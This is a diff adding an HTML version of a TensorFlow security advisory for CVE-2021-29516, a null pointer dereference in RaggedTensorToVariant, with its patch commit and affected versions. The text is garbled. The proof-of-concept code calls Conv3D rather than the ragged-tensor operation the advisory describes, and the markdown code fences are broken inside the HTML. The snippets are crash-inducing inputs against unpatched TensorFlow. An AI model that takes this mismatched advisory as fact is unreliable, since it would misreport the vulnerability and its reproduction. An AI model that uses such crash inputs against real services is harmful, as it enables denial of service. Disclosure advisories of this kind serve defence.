@@ -1,0 +1,38 @@
+<h2>TFSA-2021-005: Null pointer dereference via invalid Ragged Tensors</h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29516</p>
+<h3>Impact</h3>
+<p>Calling <code>tf.raw_ops.RaggedTensorToVariant</code> with arguments specifying an invalid ragged tensor results in a null pointer dereference:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>input_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)
+filter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)</p>
+<p>tf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 23, 1])
+```</p>
+<p>```python
+import tensorflow as tf</p>
+<p>input_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)
+filter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)</p>
+<p>tf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
+```</p>
+<p>The implementation of <a href="https://github.com/tensorflow/tensorflow/blob/904b3926ed1c6c70380d5313d282d248a776baa1/tensorflow/core/kernels/ragged_tensor_to_variant_op.cc#L39-L40"><code>RaggedTensorToVariant</code>
+operations</a>
+does not validate that the ragged tensor argument is non-empty:</p>
+<p><code>cc
+  int ragged_rank = batched_ragged.ragged_rank();
+  auto batched_splits_top_vec = batched_ragged.splits(0).vec&lt;SPLIT_TYPE&gt;();</code></p>
+<p>Since <code>batched_ragged</code> contains no elements, <code>batched_ragged.splits</code> is a null vector, thus <code>batched_ragged.splits(0)</code> will result in dereferencing <code>nullptr</code>.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/b055b9c474cd376259dde8779908f9eeaf097d93">b055b9c474cd376259dde8779908f9eeaf097d93</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
+X-Team.</p>
